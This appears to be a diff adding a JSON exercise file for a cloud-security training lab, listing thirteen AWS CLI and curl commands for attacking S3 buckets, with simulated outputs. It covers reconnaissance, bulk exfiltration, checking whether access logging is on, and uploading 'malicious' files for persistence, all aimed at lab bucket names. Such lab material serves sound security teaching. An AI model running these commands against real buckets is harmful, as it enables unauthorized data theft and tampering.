@@ -1,0 +1,145 @@
+[
+  {
+    "id": 1,
+    "name": "List S3 Buckets",
+    "pattern": "aws s3 ls",
+    "hint": "Enumerate publicly accessible S3 buckets",
+    "example": "aws s3 ls",
+    "level": "Beginner",
+    "category": "Reconnaissance",
+    "description": "List all S3 buckets the attacker can access",
+    "expected_output": "open-lab-public\nlab-private\npermissive-policy"
+  },
+  {
+    "id": 2,
+    "name": "Check Bucket Permissions",
+    "pattern": "aws s3api list-bucket-acl --bucket {bucket}",
+    "hint": "Check who has access to a specific bucket",
+    "example": "aws s3api list-bucket-acl --bucket open-lab-public",
+    "level": "Beginner",
+    "category": "Reconnaissance",
+    "description": "Identify bucket access control lists",
+    "expected_output": "Owner: arn:aws:iam::123456789:user/admin\nPublic: Yes"
+  },
+  {
+    "id": 3,
+    "name": "List Bucket Contents",
+    "pattern": "aws s3 ls s3://{bucket} --recursive",
+    "hint": "Enumerate objects in a bucket",
+    "example": "aws s3 ls s3://open-lab-public --recursive",
+    "level": "Beginner",
+    "category": "Exfiltration",
+    "description": "Download and review all objects from bucket",
+    "expected_output": "2024-01-15 10:23:45 1024 reports/report_001.txt\n2024-01-15 10:24:12 2048 images/img_001.jpg"
+  },
+  {
+    "id": 4,
+    "name": "Download Object",
+    "pattern": "aws s3 cp s3://{bucket}/{key} {local_path}",
+    "hint": "Download a specific object from bucket",
+    "example": "aws s3 cp s3://open-lab-public/reports/report_001.txt ./report.txt",
+    "level": "Beginner",
+    "category": "Exfiltration",
+    "description": "Extract sensitive data from exposed bucket",
+    "expected_output": "download: s3://open-lab-public/reports/report_001.txt to ./report.txt"
+  },
+  {
+    "id": 5,
+    "name": "Bulk Download",
+    "pattern": "aws s3 sync s3://{bucket} {local_dir}",
+    "hint": "Recursively download entire bucket",
+    "example": "aws s3 sync s3://open-lab-public ./downloaded_data",
+    "level": "Intermediate",
+    "category": "Exfiltration",
+    "description": "Mass exfiltration of all bucket contents",
+    "expected_output": "download: s3://open-lab-public/reports/report_001.txt\ndownload: s3://open-lab-public/images/img_001.jpg"
+  },
+  {
+    "id": 6,
+    "name": "Check Object ACL",
+    "pattern": "aws s3api get-object-acl --bucket {bucket} --key {key}",
+    "hint": "Check individual object permissions",
+    "example": "aws s3api get-object-acl --bucket open-lab-public --key reports/report_001.txt",
+    "level": "Intermediate",
+    "category": "Reconnaissance",
+    "description": "Identify public objects for targeted exfiltration",
+    "expected_output": "Owner: arn:aws:iam::123456789:user/admin\nGrantee: Everyone\nPermission: READ"
+  },
+  {
+    "id": 7,
+    "name": "Access via URL",
+    "pattern": "curl https://s3.amazonaws.com/{bucket}/{key}",
+    "hint": "Download object using public URL",
+    "example": "curl https://open-lab-public.s3.amazonaws.com/reports/report_001.txt",
+    "level": "Beginner",
+    "category": "Exfiltration",
+    "description": "Direct HTTP access to public objects",
+    "expected_output": "DUMMY REPORT 1\\nTHIS IS FAKE DATA ONLY."
+  },
+  {
+    "id": 8,
+    "name": "Scan Bucket Policy",
+    "pattern": "aws s3api get-bucket-policy --bucket {bucket}",
+    "hint": "Extract bucket policy for analysis",
+    "example": "aws s3api get-bucket-policy --bucket permissive-policy",
+    "level": "Intermediate",
+    "category": "Reconnaissance",
+    "description": "Analyze IAM policies for misconfigurations",
+    "expected_output": "Statement: Allow * Principal on s3:*"
+  },
+  {
+    "id": 9,
+    "name": "List Bucket Versions",
+    "pattern": "aws s3api list-object-versions --bucket {bucket}",
+    "hint": "Enumerate object versions for recovery",
+    "example": "aws s3api list-object-versions --bucket lab-private",
+    "level": "Advanced",
+    "category": "Reconnaissance",
+    "description": "Recover deleted objects from bucket versions",
+    "expected_output": "Key: secret_doc.txt Version: v1 Status: CURRENT"
+  },
+  {
+    "id": 10,
+    "name": "Check Bucket Logging",
+    "pattern": "aws s3api get-bucket-logging --bucket {bucket}",
+    "hint": "Determine if bucket logs access",
+    "example": "aws s3api get-bucket-logging --bucket open-lab-public",
+    "level": "Intermediate",
+    "category": "Reconnaissance",
+    "description": "Identify if actions are being monitored",
+    "expected_output": "LoggingEnabled: false"
+  },
+  {
+    "id": 11,
+    "name": "Extract Metadata",
+    "pattern": "aws s3api head-object --bucket {bucket} --key {key}",
+    "hint": "Get object metadata without downloading",
+    "example": "aws s3api head-object --bucket open-lab-public --key reports/report_001.txt",
+    "level": "Intermediate",
+    "category": "Reconnaissance",
+    "description": "Identify sensitive file properties",
+    "expected_output": "ContentType: text/plain Size: 1024 LastModified: 2024-01-15"
+  },
+  {
+    "id": 12,
+    "name": "Enumerate IAM Roles",
+    "pattern": "aws iam list-roles",
+    "hint": "Discover available IAM roles for privilege escalation",
+    "example": "aws iam list-roles | grep -i s3",
+    "level": "Advanced",
+    "category": "Reconnaissance",
+    "description": "Identify potential role assumptions",
+    "expected_output": "RoleName: S3AccessRole\nRoleName: LambdaExecutionRole"
+  },
+  {
+    "id": 13,
+    "name": "Test Write Access",
+    "pattern": "echo 'evil' | aws s3 cp - s3://{bucket}/malicious.txt",
+    "hint": "Attempt to upload file to bucket",
+    "example": "echo 'test' | aws s3 cp - s3://open-lab-public/test.txt",
+    "level": "Advanced",
+    "category": "Persistence",
+    "description": "Backdoor bucket with malicious files",
+    "expected_output": "upload: - to s3://open-lab-public/test.txt"
+  }
+]
